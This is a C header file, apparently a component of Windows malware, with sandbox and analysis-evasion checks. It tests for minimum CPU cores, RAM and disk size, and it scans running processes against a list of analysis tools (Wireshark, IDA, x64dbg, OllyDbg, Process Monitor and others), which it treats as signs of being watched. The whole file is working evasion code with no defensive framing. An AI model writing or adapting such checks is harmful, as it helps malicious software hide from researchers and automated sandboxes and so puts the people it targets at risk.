#ifndef H_EVASION
#define H_EVASION

#include "common.h"


// Function to check if system has at least 2 CPU cores
BOOL checkCPU() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    return numberOfProcessors >= 2;
}

// Function to check if system has at least 2GB RAM
BOOL checkRAM() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    return RAMMB >= 2048;
}

// Function to check if system has at least 100GB HDD
BOOL checkHDD() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY,
        NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry),
        &bytesReturned, NULL);

    CloseHandle(hDevice);

    if (!result) {
        return FALSE;
    }

    DWORDLONG diskSizeGB = pDiskGeometry.Cylinders.QuadPart *
        (ULONG)pDiskGeometry.TracksPerCylinder *
        (ULONG)pDiskGeometry.SectorsPerTrack *
        (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;

    return diskSizeGB >= 100;
}

// Function to check for analysis/debugging tools
BOOL checkProcesses() {
    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return TRUE; // Return TRUE to continue if we can't check processes
    }

    // List of processes to detect
    const WCHAR* detectedProcesses[] = {
        L"WIRESHARK.EXE",
        L"IDAFREE.EXE",      // IDA Free
        L"IDAFREE64.EXE",    // IDA Free 64-bit
        L"IDA.EXE",          // Commercial IDA
        L"IDA64.EXE",        // Commercial IDA 64-bit
        L"X64DBG.EXE",       // x64dbg
        L"X32DBG.EXE",       // x32dbg (32-bit version)
        L"OLLYDBG.EXE",      // OllyDbg
        L"PROCMON.EXE",      // Process Monitor
        L"PROCEXP.EXE",      // Process Explorer
        L"DUMPCAP.EXE",      // Wireshark component
        L"TSHARK.EXE"        // Wireshark command line
    };

    const int processCount = sizeof(detectedProcesses) / sizeof(detectedProcesses[0]);
    BOOL maliciousProcessFound = FALSE;
    WCHAR processName[MAX_PATH + 1];
    int detectedCount = 0;

    if (Process32FirstW(hSnapshot, &processEntry)) {
        do {
            // Use wcsncpy for MinGW compatibility instead of StringCchCopyW
            wcsncpy(processName, processEntry.szExeFile, MAX_PATH);
            processName[MAX_PATH] = L'\0'; // Ensure null termination
            CharUpperW(processName);

            // Check against our list of analysis tools
            for (int i = 0; i < processCount; i++) {
                if (wcsstr(processName, detectedProcesses[i])) {
                    if (!maliciousProcessFound) {
                        maliciousProcessFound = TRUE;
                    }
                    detectedCount++;
                    break; // Break inner loop, but continue checking other processes
                }
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);

    return !maliciousProcessFound; // Return TRUE if no bad processes found
}

#endif